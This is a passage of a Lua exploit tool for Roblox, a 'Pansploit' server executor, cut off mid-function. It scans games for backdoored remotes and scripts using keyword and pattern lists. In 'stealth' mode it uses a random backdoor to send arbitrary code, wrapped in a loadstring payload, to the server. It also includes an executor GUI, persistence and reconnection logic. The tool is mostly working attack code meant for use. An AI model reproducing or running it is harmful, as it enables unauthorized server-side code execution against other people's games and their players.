local _bs = {}
_bs._a = false
_bs._selected = nil
_bs._selectedType = nil
_bs._backup = {}
_bs._monitor = nil
_bs._gameMonitor = nil
_bs._r = {}
_bs._n = {}
_bs._f = {}
_bs._m = {}
_bs._s = tick()
_bs._cb = nil
_bs._currentGameId = nil
_bs._gui = nil
_bs._internalManagerGUI = nil

-- Persistence Storage
if not _G._pans_backdoor_storage then
    _G._pans_backdoor_storage = {
        detectedBackdoors = {},
        selectedPath = nil,
        selectedType = nil,
        useInternalGUI = false
    }
end
local _storage = _G._pans_backdoor_storage

-- Config
local _cfg = {
    debug = false,
    stealth = true,
    maxScanDepth = 20,
    executionDelay = 0.05,
    monitorInterval = 2,
    autoReconnect = true
}

-- Obfuscated strings
local _str = {
    loadstring = ("\108\111\97\100\115\116\114\105\110\103"),
    require = ("\114\101\113\117\105\114\101"),
    RemoteEvent = ("\82\101\109\111\116\101\69\118\101\110\116"),
    RemoteFunction = ("\82\101\109\111\116\101\70\117\110\99\116\105\111\110"),
}

-- Patterns
local _pat = {
    "loadstring%(%s*%)%(%)",
    "OnServerEvent%:Connect%(.-loadstring",
    "OnServerInvoke%s*=%s*function.-loadstring",
    "Instance%.new%([\"']RemoteEvent[\"'].-loadstring",
    "getfenv%(%s*%)%[%s*loadstring",
    "setfenv%(.-loadstring",
}

-- Categories
local _cat = {
    normal = {"DataEvent", "UpdateEvent", "RequestEvent", "ResponseEvent", "PlayerEvent", "GameEvent", "Replicate", "Sync", "Remote", "Function", "Callback"},
    suspicious = {"Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", "Source", "Require", "Module", "Load", "Eval", "RunCode", "Backdoor", "Exploit", "Virus", "Infect"}
}

-- C# Compatible Categories
local CATEGORIES = {
    MALICIOUS = "MALICIOUS",
    SUSPICIOUS = "SUSPICIOUS",
    BACKDOORED_FUNC = "BACKDOORED_FUNC",
    INFECTED_SCRIPT = "INFECTED_SCRIPT",
    NORMAL = "NORMAL"
}

-- Logging
local function _log(m, t)
    t = t or "INFO"
    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" or t == "REACTIVATE" or t == "GUI" then
        print(("[BD:%s] %s"):format(t, m))
    end
    if _bs._cb then _bs._cb(m, t) end
end

-- Get color for category (for internal GUI)
function GetCategoryColor(category)
    local colors = {
        MALICIOUS = Color3.fromRGB(255, 80, 80),
        SUSPICIOUS = Color3.fromRGB(255, 220, 80),
        BACKDOORED_FUNC = Color3.fromRGB(255, 140, 40),
        INFECTED_SCRIPT = Color3.fromRGB(200, 100, 255),
        NORMAL = Color3.fromRGB(80, 255, 120)
    }
    return colors[category] or Color3.fromRGB(150, 150, 150)
end

-- String pattern detection
local function _hasPattern(s, patterns)
    for _, p in ipairs(patterns) do
        if string.find(s, p) then return true end
    end
    return false
end

-- Malicious patterns for script analysis
local MALICIOUS_PATTERNS = {
    "loadstring", "game:HttpGet", "http.request", "syn.request",
    "setclipboard", "keylogger", "steal", "grab", "webhook",
    "getgenv", "getrawmetatable", "hookfunction", "replaceclosure",
    "writefile", "appendfile", "makefolder", "delfile",
    "islclosure", "checkcaller", "getconnections", "firesignal"
}

local SUSPICIOUS_PATTERNS = {
    "require", "spawn", "pcall", "xpcall", "coroutine",
    "while true do", "repeat until", "for.*do.*end"
}

-- Get script source
local function _getSource(obj)
    if not obj then return nil end
    local s, r = pcall(function()
        if obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            if obj.Source then return obj.Source end
        end
        return nil
    end)
    if s then return r end
    return nil
end

-- Analyze script for backdoors (C# compatible)
local function _analyzeScript(obj)
    local source = _getSource(obj)
    if not source then 
        return {Category = CATEGORIES.NORMAL, Confidence = 0, Path = obj:GetFullName()}
    end
    
    local score = 0
    local reasons = {}
    
    if _hasPattern(source, MALICIOUS_PATTERNS) then
        score = score + 40
        table.insert(reasons, "Malicious patterns detected")
    end
    
    if _hasPattern(source, SUSPICIOUS_PATTERNS) then
        score = score + 20
        table.insert(reasons, "Suspicious patterns detected")
    end
    
    if string.len(source) > 5000 and string.find(source, "[%z\001-\008\011-\012\014-\031]") then
        score = score + 30
        table.insert(reasons, "Possible obfuscation")
    end
    
    if string.find(source, "http") or string.find(source, "request") then
        score = score + 25
        table.insert(reasons, "Network activity")
    end
    
    local category = CATEGORIES.NORMAL
    if score >= 70 then
        category = CATEGORIES.MALICIOUS
    elseif score >= 50 then
        category = CATEGORIES.BACKDOORED_FUNC
    elseif score >= 30 then
        category = CATEGORIES.SUSPICIOUS
    elseif score >= 15 then
        category = CATEGORIES.INFECTED_SCRIPT
    end
    
    return {
        Path = obj:GetFullName(),
        Category = category,
        Confidence = math.min(score, 100),
        Type = obj.ClassName,
        ExecutionMethod = "source_analysis",
        Reasons = reasons,
        Object = obj
    }
end

-- Check if name is suspicious
local function _isSus(n)
    if not n then return false, 0 end
    n = tostring(n):lower()
    local s = 0
    for _, p in ipairs(_cat.suspicious) do
        if n:find(p:lower()) then s = s + 30 end
    end
    return s > 0, s
end

-- Check if name is normal
local function _isNormal(n)
    if not n then return false end
    n = tostring(n):lower()
    for _, p in ipairs(_cat.normal) do
        if n:find(p:lower()) then return true end
    end
    return false
end

-- Original script analysis (from BACKDOORAPI)
local function _analyzeScriptOriginal(scr)
    if not scr or not scr:IsA("LuaSourceContainer") then return nil end
    
    local info = {
        Object = scr,
        Name = scr.Name,
        Path = scr:GetFullName(),
        SuspiciousPatterns = {},
        RiskScore = 0,
        IsBackdoor = false
    }
    
    local ok, src = pcall(function() return scr.Source end)
    
    if not ok or not src or src == "" then
        local name = tostring(scr.Name):lower()
        if name:find("backdoor") or name:find("exploit") or name:find("virus") then
            info.RiskScore = 100
            info.IsBackdoor = true
            table.insert(info.SuspiciousPatterns, "suspicious_name")
        end
        return info.RiskScore > 50 and info or nil
    end
    
    for _, pattern in ipairs(_pat) do
        if src:find(pattern) then
            table.insert(info.SuspiciousPatterns, pattern)
            info.RiskScore = info.RiskScore + 40
        end
    end
    
    if src:find("Instance%.new%s*%(%s*[\"']Remote") then
        info.RiskScore = info.RiskScore + 50
        table.insert(info.SuspiciousPatterns, "dynamic_remote_creation")
    end
    
    if src:find("getfenv") or src:find("setfenv") then
        info.RiskScore = info.RiskScore + 30
        table.insert(info.SuspiciousPatterns, "env_manipulation")
    end
    
    info.IsBackdoor = info.RiskScore >= 60
    return info.RiskScore > 30 and info or nil
end

-- Scan function (merged from both)
local function _scan(i, d)
    d = d or 0
    if d > _cfg.maxScanDepth then return {}, {}, {} end
    
    local rmt = {}
    local scr = {}
    local mdl = {}
    
    local success, isRemote = pcall(function()
        return i:IsA(_str.RemoteEvent) or i:IsA(_str.RemoteFunction)
    end)
    
    if success and isRemote then
        local sus, score = _isSus(i.Name)
        local norm = _isNormal(i.Name)
        local cat = sus and "MALICIOUS" or (norm and "NORMAL" or "UNKNOWN")
        
        local id = ""
        pcall(function() id = i:GetDebugId() end)
        
        table.insert(rmt, {
            Object = i,
            Name = i.Name,
            Type = i.ClassName,
            Path = i:GetFullName(),
            Category = cat,
            RiskScore = score or 0,
            Suspicious = sus,
            Parent = i.Parent,
            Depth = d,
            InstanceId = id
        })
    end
    
    local isScript = pcall(function()
        return i:IsA("Script") or i:IsA("LocalScript") or i:IsA("ModuleScript")
    end)
    
    if isScript then
        local analysis = _analyzeScriptOriginal(i)
        if analysis then
            table.insert(scr, analysis)
        end
    end
    
    local isModel = pcall(function()
        return i:IsA("Model") or i:IsA("Folder")
    end)
    
    if isModel then
        local children = {}
        pcall(function() children = i:GetDescendants() end)
        
        for _, desc in ipairs(children) do
            local isServerScript = pcall(function()
                return desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server
            end)
            
            if isServerScript then
                local n = tostring(desc.Name)
                if #n > 50 or n:find("[\128-\255]") or n:match("^%s+$") or not desc.Archivable then
                    table.insert(mdl, {Model = i, Script = desc, Reason = "hidden_server"})
                    break
                end
            end
        end
    end
    
    local children = {}
    pcall(function() children = i:GetChildren() end)
    
    for _, c in ipairs(children) do
        local cr, cs, cm = _scan(c, d + 1)
        for _, v in ipairs(cr) do table.insert(rmt, v) end
        for _, v in ipairs(cs) do table.insert(scr, v) end
        for _, v in ipairs(cm) do table.insert(mdl, v) end
    end
    
    return rmt, scr, mdl
end

-- Test function
local function _test(r, depth)
    depth = depth or 0
    if depth > 3 then return false, nil, 0 end
    
    local v = false
    local m = nil
    local c = r.RiskScore or 0
    
    local p = r.Parent
    if p then
        local pn = tostring(p.Name):lower()
        if pn:find("backdoor") or pn:find("exploit") or pn:find("virus") then
            v = true
            m = "infected_container"
            c = c + 50
        end
        
        local isModel = pcall(function() return p:IsA("Model") end)
        if isModel then
            local children = {}
            pcall(function() children = p:GetDescendants() end)
            
            for _, d in ipairs(children) do
                local isScript = pcall(function() return d:IsA("Script") end)
                if isScript then
                    local dn = tostring(d.Name)
                    if dn:sub(1,1) == "\0" or dn:find("\239\191\189") then
                        v = true
                        m = m or "hidden_script"
                        c = c + 40
                        r.InfectedModel = p
                        break
                    end
                end
            end
        end
    end
    
    if r.Category == "MALICIOUS" then
        v = true
        m = m or "categorized_malicious"
        c = c + 30
    end
    
    local ok, attrs = pcall(function()
        return r.Object:GetAttribute("Backdoor") or r.Object:GetAttribute("Exploit")
    end)
    if ok and attrs then
        v = true
        m = m or "marked_attribute"
        c = c + 100
    end
    
    return v, m, c
end

-- Select random backdoor
local function _selectRandomBackdoor(backdoors)
    if #backdoors == 0 then return nil, {} end
    if #backdoors == 1 then return backdoors[1], {} end
    
    math.randomseed(tick())
    local selectedIndex = math.random(1, #backdoors)
    local selected = backdoors[selectedIndex]
    
    local backup = {}
    for i, bd in ipairs(backdoors) do
        if i ~= selectedIndex then
            table.insert(backup, bd)
        end
    end
    
    return selected, backup
end

-- Undetectable execution
local function _undetectableExec(code)
    if not _bs._selected then
        _log("No backdoor selected", "ERROR")
        return false
    end
    
    local r = _bs._selected.Object
    local t = _bs._selected.Type
    
    local exists = pcall(function() return r.Parent end)
    if not exists then
        _log("Backdoor no longer exists!", "ERROR")
        _bs.Disconnect()
        return false
    end
    
    local function method1()
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(code) end)
        else
            pcall(function() r:InvokeServer(code) end)
        end
    end
    
    local function method4()
        local payload = ([[
            local _c = "%s"
            local _f = loadstring or load
            if _f then pcall(_f, _c) end
        ]]):format(code:gsub("\"", "\\\""))
        
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(payload) end)
        else
            pcall(function() r:InvokeServer(payload) end)
        end
    end
    
    if _cfg.stealth then
        local ok1 = pcall(method4)
        if ok1 then return true end
        local ok2 = pcall(method1)
        return ok2
    else
        local ok = pcall(method1)
        return ok
    end
end

-- Find backdoor by path
local function _findBackdoorByPath(path)
    if not path then return nil end
    
    local segments = {}
    for segment in string.gmatch(path, "[^%.]+") do
        table.insert(segments, segment)
    end
    
    local current = game
    for i, segment in ipairs(segments) do
        if segment == "game" then
            current = game
        else
            local found = nil
            local children = {}
            pcall(function() children = current:GetChildren() end)
            
            for _, child in ipairs(children) do
                if child.Name == segment then
                    found = child
                    break
                end
            end
            
            if not found then
                local ok, svc = pcall(function() return game:GetService(segment) end)
                if ok and svc then
                    found = svc
                else
                    return nil
                end
            end
            
            current = found
        end
    end
    
    local isValid = pcall(function()
        return current:IsA("RemoteEvent") or current:IsA("RemoteFunction")
    end)
    
    if isValid then
        return {
            Object = current,
            Name = current.Name,
            Type = current.ClassName,
            Path = path,
            Category = "MALICIOUS",
            Vulnerable = true,
            ExecutionMethod = "reactivated"
        }
    end
    
    return nil
end

-- Quick scan for reactivation
local function _quickScan()
    local quickServices = {
        game:GetService("ReplicatedStorage"),
        game:GetService("Workspace")
    }
    
    local foundRemotes = {}
    
    for _, svc in ipairs(quickServices) do
        local children = {}
        pcall(function() children = svc:GetDescendants() end)
        
        for _, obj in ipairs(children) do
            local isRemote = pcall(function()
                return obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
            end)
            
            if isRemote then
                local sus, score = _isSus(obj.Name)
                if sus then
                    table.insert(foundRemotes, {
                        Object = obj,
                        Name = obj.Name,
                        Type = obj.ClassName,
                        Path = obj:GetFullName(),
                        Category = "MALICIOUS",
                        RiskScore = score,
                        Vulnerable = true,
                        ExecutionMethod = "quick_reactivate"
                    })
                end
            end
        end
    end
    
    if #foundRemotes > 0 then
        local selected, backup = _selectRandomBackdoor(foundRemotes)
        _bs._selected = selected
        _bs._backup = backup
        return true
    end
    
    return false
end

-- Direct execute
local function _directExecute(code, backdoorInfo)
    if not backdoorInfo or not backdoorInfo.Object then
        return false
    end
    
    local r = backdoorInfo.Object
    local t = backdoorInfo.Type
    
    local exists = pcall(function() return r.Parent end)
    if not exists then
        return false
    end
    
    local function tryExecute()
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(code) end)
        else
            pcall(function() r:InvokeServer(code) end)
        end
    end
    
    return pcall(tryExecute)
end

-- Update GUI status
local function _updateGUIStatus(isActive)
    if _bs._guiStatusDot and _bs._guiStatusText then
        if isActive then
            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            _bs._guiStatusText.Text = "Active"
            _bs._guiStatusText.TextColor3 = Color3.fromRGB(0, 255, 0)
        else
            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            _bs._guiStatusText.Text = "Disconnected"
            _bs._guiStatusText.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
    end
end

-- Show GUI
local function _showGUI()
    if _bs._gui then
        _bs._gui.Enabled = true
    else
        _createGUI()
    end
end

-- Create Main GUI Executor
local function _createGUI()
    if _bs._gui then
        pcall(function() _bs._gui:Destroy() end)
    end
    
    local player = game:GetService("Players").LocalPlayer
    if not player then return nil end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PanExecutor"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    pcall(function()
        screenGui.Parent = game:GetService("CoreGui")
    end)
    
    if not screenGui.Parent then
        screenGui.Parent = player:WaitForChild("PlayerGui")
    end
    
    _bs._gui = screenGui
    
    -- Main Frame
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 400, 0, 300)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = mainFrame
    
    -- Title Bar
    local titleBar = Instance.new("Frame")
    titleBar.Name = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 8)
    titleCorner.Parent = titleBar
    
    local titleText = Instance.new("TextLabel")
    titleText.Name = "Title"
    titleText.Size = UDim2.new(1, -100, 1, 0)
    titleText.Position = UDim2.new(0, 10, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "[Pansploit] Server Executor"
    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleText.Font = Enum.Font.SourceSansBold
    titleText.TextSize = 16
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleBar
    
    -- Status Indicator
    local statusDot = Instance.new("Frame")
    statusDot.Name = "StatusDot"
    statusDot.Size = UDim2.new(0, 10, 0, 10)
    statusDot.Position = UDim2.new(1, -85, 0.5, -5)
    statusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    statusDot.BorderSizePixel = 0
    statusDot.Parent = titleBar
    
    local statusCorner = Instance.new("UICorner")
    statusCorner.CornerRadius = UDim.new(1, 0)
    statusCorner.Parent = statusDot
    
    local statusText = Instance.new("TextLabel")
    statusText.Name = "StatusText"
    statusText.Size = UDim2.new(0, 60, 1, 0)
    statusText.Position = UDim2.new(1, -75, 0, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "Active"
    statusText.TextColor3 = Color3.fromRGB(0, 255, 0)
    statusText.Font = Enum.Font.SourceSans
    statusText.TextSize = 14
    statusText.Parent = titleBar
    
    _bs._guiStatusDot = statusDot
    _bs._guiStatusText = statusText
    
    -- Minimize Button
    local minButton = Instance.new("TextButton")
    minButton.Name = "Minimize"
    minButton.Size = UDim2.new(0, 25, 0, 25)
    minButton.Position = UDim2.new(1, -55, 0, 2)
    minButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    minButton.Text = "-"
    minButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    minButton.Font = Enum.Font.SourceSansBold
    minButton.TextSize = 18
    minButton.Parent = titleBar
    
    local minCorner = Instance.new("UICorner")
    minCorner.CornerRadius = UDim.new(0, 4)
    minCorner.Parent = minButton
    
    -- Close Button
    local closeButton = Instance.new("TextButton")
    closeButton.Name = "Close"
    closeButton.Size = UDim2.new(0, 25, 0, 25)
    closeButton.Position = UDim2.new(1, -28, 0, 2)
    closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.Font = Enum.Font.SourceSansBold
    closeButton.TextSize = 14
    closeButton.Parent = titleBar
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 4)
    closeCorner.Parent = closeButton
    
    -- Script TextBox
    local textBox = Instance.new("TextBox")
    textBox.Name = "ScriptBox"
    textBox.Size = UDim2.new(1, -20, 1, -80)
    textBox.Position = UDim2.new(0, 10, 0, 40)
    textBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.PlaceholderText = "-- Enter server-side script here..."
    textBox.Text = ""
    textBox.Font = Enum.Font.SourceSans
    textBox.TextSize = 14
    textBox.TextXAlignment = Enum.TextXAlignment.Left
    textBox.TextYAlignment = Enum.TextYAlignment.Top
    textBox.ClearTextOnFocus = false
    textBox.MultiLine = true
    textBox.TextWrapped = true
    textBox.Parent = mainFrame
    
    local textCorner = Instance.new("UICorner")
    textCorner.CornerRadius = UDim.new(0, 4)
    textCorner.Parent = textBox
    
    -- Button Frame
    local buttonFrame = Instance.new("Frame")
    buttonFrame.Name = "ButtonFrame"
    buttonFrame.Size = UDim2.new(1, -20, 0, 30)
    buttonFrame.Position = UDim2.new(0, 10, 1, -35)
    buttonFrame.BackgroundTransparency = 1
    buttonFrame.Parent = mainFrame
    
    -- Execute Button
    local execButton = Instance.new("TextButton")
    execButton.Name = "Execute"
    execButton.Size = UDim2.new(0.32, -5, 1, 0)
    execButton.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
    execButton.Text = "Execute"
    execButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    execButton.Font = Enum.Font.SourceSansBold
    execButton.TextSize = 14
    execButton.Parent = buttonFrame
    
    local execCorner = Instance.new("UICorner")
    execCorner.CornerRadius = UDim.new(0, 4)
    execCorner.Parent = execButton
    
    -- Clear Button
    local clearButton = Instance.new("TextButton")
    clearButton.Name = "Clear"
    clearButton.Size = UDim2.new(0.32, -5, 1, 0)
    clearButton.Position = UDim2.new(0.34, 0, 0, 0)
    clearButton.BackgroundColor3 = Color3.fromRGB(100, 100, 0)
    clearButton.Text = "Clear"
    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearButton.Font = Enum.Font.SourceSansBold
    clearButton.TextSize = 14
    clearButton.Parent = buttonFrame
    
    local clearCorner = Instance.new("UICorner")
    clearCorner.CornerRadius = UDim.new(0, 4)
    clearCorner.Parent = clearButton
    
    -- Disconnect Button
    local discButton = Instance.new("TextButton")
    discButton.Name = "Disconnect"
    discButton.Size = UDim2.new(0.32, -5, 1, 0)
    discButton.Position = UDim2.new(0.68, 5, 0, 0)
    discButton.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
    discButton.Text = "Disconnect"
    discButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    discButton.Font = Enum.Font.SourceSansBold
    discButton.TextSize = 14
    discButton.Parent = buttonFrame
    
    local discCorner = Instance.new("UICorner")
    discCorner.CornerRadius = UDim.new(0, 4)
    discCorner.Parent = discButton
    
    -- Button functionality
    execButton.MouseButton1Click:Connect(function()
        local script = textBox.Text
        if script and #script > 0 then
            _log("GUI Execute clicked", "GUI")
            local success = _bs.Execute(script)
            if success then
                _log("GUI Execute success", "GUI")
            else
                _log("GUI Execute failed", "GUI")
            end
        else
            _log("GUI: Empty script", "GUI")
        end
    end)
    
    clearButton.MouseButton1Click:Connect(function()
        textBox.Text = ""
        _log("GUI Clear clicked", "GUI")
    end)
    
    discButton.MouseButton1Click:Connect(function()
        _log("GUI Disconnect clicked", "GUI")
        _updateGUIStatus(false)
        _bs.Disconnect()
    end)
    
    -- Minimize functionality
    local minimized = false
    minButton.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            textBox.Visible = false
            buttonFrame.Visible = false
            mainFrame.Size = UDim2.new(0, 400, 0, 30)
            minButton.Text = "+"
        else
            textBox.Visible = true
            buttonFrame.Visible = true
            mainFrame.Size = UDim2.new(0, 400, 0, 300)
            minButton.Text = "-"
        end
    end)
    
    -- Close/Hide functionality
    closeButton.MouseButton1Click:Connect(function()
        _log("GUI Close clicked", "GUI")
        screenGui.Enabled = false
    end)
    
    _log("GUI Created successfully", "GUI")
    return screenGui
end

-- Create Internal Manager GUI (backup when external fails)
local function _createInternalManager(allBackdoors, callback)
    if _bs._internalManagerGUI then
        pcall(function() _bs._internalManagerGUI:Destroy() end)
    end
    
    local player = game:GetService("Players").LocalPlayer
    if not player then return end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PanInternalManager"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
    if not screenGui.Parent then
        screenGui.Parent = player:WaitForChild("PlayerGui")
    end
    
    _bs._internalManagerGUI = screenGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "ManagerFrame"
    mainFrame.Size = UDim2.new(0, 600, 0, 450)
    mainFrame.Position = UDim2.new(0.5, -300, 0.5, -225)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame
    
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 40)
    titleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = titleBar
    
    local titleFix = Instance.new("Frame")
    titleFix.Size = UDim2.new(1, 0, 0.5, 0)
    titleFix.Position = UDim2.new(0, 0, 0.5, 0)
    titleFix.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    titleFix.BorderSizePixel = 0
    titleFix.Parent = titleBar
    
    local titleText = Instance.new("TextLabel")
    titleText.Size = UDim2.new(1, -20, 1, 0)
    titleText.Position = UDim2.new(0, 15, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "[Pansploit] Internal Backdoor Manager (BACKUP)"
    titleText.TextColor3 = Color3.fromRGB(255, 100, 100)
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 16
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleBar
    
    local noteText = Instance.new("TextLabel")
    noteText.Size = UDim2.new(1, -20, 0, 30)
    noteText.Position = UDim2.new(0, 10, 0, 45)
    noteText.BackgroundTransparency = 1
    noteText.Text = "⚠️ External manager blocked! Using internal backup."
    noteText.TextColor3 = Color3.fromRGB(255, 200, 100)
    noteText.Font = Enum.Font.Gotham
    noteText.TextSize = 11
    noteText.TextWrapped = true
    noteText.Parent = mainFrame
    
    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Size = UDim2.new(1, -20, 1, -130)
    scrollFrame.Position = UDim2.new(0, 10, 0, 80)
    scrollFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #allBackdoors * 70)
    scrollFrame.Parent = mainFrame
    
    local scrollCorner = Instance.new("UICorner")
    scrollCorner.CornerRadius = UDim.new(0, 6)
    scrollCorner.Parent = scrollFrame
    
    local selectedBackdoor = nil
    
    for i, bd in ipairs(allBackdoors) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -20, 0, 60)
        btn.Position = UDim2.new(0, 10, 0, (i-1) * 70)
        btn.BackgroundColor3 = GetCategoryColor(bd.Category)
        btn.BackgroundTransparency = 0.7
        btn.Text = string.format("[%s] %s\nConfidence: %d%% | Type: %s", 
            bd.Category, bd.Path, bd.Confidence, bd.Type)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.Code
        btn.TextSize = 11
        btn.TextWrapped = true
        btn.TextXAlignment = Enum.TextXAlignment.Left
        btn.Parent = scrollFrame
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn
        
        btn.MouseButton1Click:Connect(function()
            selectedBackdoor = bd
            for _, child in ipairs(scrollFrame:GetChildren()) do
                if child:IsA("TextButton") then
                    child.BackgroundTransparency = 0.7
                end
            end
            btn.BackgroundTransparency = 0.3
        end)
    end
    
    local confirmBtn = Instance.new("TextButton")
    confirmBtn.Size = UDim2.new(0.45, -10, 0, 35)
    confirmBtn.Position = UDim2.new(0.05, 0, 1, -45)
    confirmBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
    confirmBtn.Text = "Confirm Selection"
    confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    confirmBtn.Font = Enum.Font.GothamBold
    confirmBtn.TextSize = 14
    confirmBtn.Parent = mainFrame
    
    local cancelBtn = Instance.new("TextButton")
    cancelBtn.Size = UDim2.new(0.45, -10, 0, 35)
    cancelBtn.Position = UDim2.new(0.5, 0, 1, -45)
    cancelBtn.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
    cancelBtn.Text = "Cancel"
    cancelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    cancelBtn.Font = Enum.Font.GothamBold
    cancelBtn.TextSize = 14
    cancelBtn.Parent = mainFrame
    
    local btnCorner1 = Instance.new("UICorner")
    btnCorner1.CornerRadius = UDim.new(0, 6)
    btnCorner1.Parent = confirmBtn
    
    local btnCorner2 = Instance.new("UICorner")
    btnCorner2.CornerRadius = UDim.new(0, 6)
    btnCorner2.Parent = cancelBtn
    
    confirmBtn.MouseButton1Click:Connect(function()
        if selectedBackdoor then
            screenGui:Destroy()
            _bs._internalManagerGUI = nil
            callback(selectedBackdoor)
        else
            mainFrame.Position = UDim2.new(0.5, -310, 0.5, -225)
            wait(0.05)
            mainFrame.Position = UDim2.new(0.5, -290, 0.5, -225)
            wait(0.05)
            mainFrame.Position = UDim2.new(0.5, -300, 0.5, -225)
        end
    end)
    
    cancelBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        _bs._internalManagerGUI = nil
        callback(nil)
    end)
    
    _log("Internal Manager GUI created (backup mode)", "GUI")
end

-- Monitoring functions
local function _startMonitoring()
    if _bs._monitor then
        pcall(function() _bs._monitor:Disconnect() end)
        _bs._monitor = nil
    end
    
    if not _bs._selected or not _bs._selected.Object then
        _log("No backdoor to monitor", "WARN")
        return
    end
    
    local target = _bs._selected.Object
    local parent = target.Parent
    local name = target.Name
    local path = _bs._selected.Path
    
    _storage.selectedPath = path
    _storage.selectedType = _bs._selected.Type
    
    _log("Monitoring: " .. path, "MONITOR")
    
    local lastCheck = tick()
    local rs = game:GetService("RunService")
    
    _bs._monitor = rs.Heartbeat:Connect(function()
        if tick() - lastCheck < _cfg.monitorInterval then return end
        lastCheck = tick()
        
        local exists, currentParent, currentName = pcall(function()
            return target.Parent, target.Name
        end)
        
        if not exists then
            _log("BACKDOOR_REMOVED: " .. path, "DISCONNECT")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
        
        if currentParent ~= parent then
            _log("BACKDOOR_MOVED: " .. path, "DISCONNECT")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
        
        if currentName ~= name then
            _log("BACKDOOR_RENAMED: " .. path, "DISCONNECT")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
    end)
end

local function _startGameMonitoring()
    if _bs._gameMonitor then
        pcall(function() _bs._gameMonitor:Disconnect() end)
        _bs._gameMonitor = nil
    end
    
    _bs._currentGameId = tostring(game.GameId)
    _log("Game monitoring started. GameId: " .. _bs._currentGameId, "MONITOR")
    
    local rs = game:GetService("RunService")
    local lastGameCheck = tick()
    
    _bs._gameMonitor = rs.Heartbeat:Connect(function()
        if tick() - lastGameCheck < 1 then return end
        lastGameCheck = tick()
        
        local currentGameId = tostring(game.GameId)
        if currentGameId ~= _bs._currentGameId then
            _log("GAME_CHANGED: " .. _bs._currentGameId .. " -> " .. currentGameId, "LEAVE")
